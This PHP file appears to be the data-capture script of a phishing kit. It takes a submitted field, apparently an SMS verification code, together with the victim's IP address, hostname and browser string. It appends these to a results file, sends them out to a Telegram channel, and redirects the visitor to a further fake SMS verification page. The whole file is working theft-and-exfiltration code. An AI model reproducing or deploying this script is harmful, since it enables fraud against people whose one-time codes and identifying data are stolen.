<?php
require_once '../../../ventro/zabiosobi.php';
$ip = getenv("REMOTE_ADDR");
$message .= "----LKHRA/LAKHAR-----\n";
$message .= "FLOSSA/     	 : ".$_POST['srfer']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-----------BY-/EOGL---------------\n";
$message .= "-------------- SMS/DATE----------\n";
$message .= "---------SMS-TANIIII-----22222222222222 DATE/SMS/ ------------\n";
$fp = fopen('../../../alresult.txt', 'a');
fwrite($fp, $message);
fclose($fp);
telegram_send(urlencode($message));
header("Location:  ../sms_verif.html");?>